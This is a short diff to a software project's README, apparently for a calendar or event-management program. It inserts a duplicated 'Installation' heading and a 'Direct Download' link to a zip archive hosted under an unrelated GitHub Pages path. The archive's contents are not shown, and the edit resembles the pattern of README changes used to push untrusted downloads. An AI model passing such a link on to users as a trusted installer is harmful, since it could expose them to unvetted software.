@@ -44,6 +44,11 @@ This enhanced edition introduces modern event management features such as **sear
 - **TDM-GCC**
 
 ### Installation
+### Installation
+
+ **Direct Download** – [Click here](https://krushnansh22.github.io/DSA-CP/Calendar_setup.zip) 
+**OR** 
+**Visit Website: https://krushnansh22.github.io/DSA-CP/**
 
 1. **Clone or Download the Repository**
 ```bash
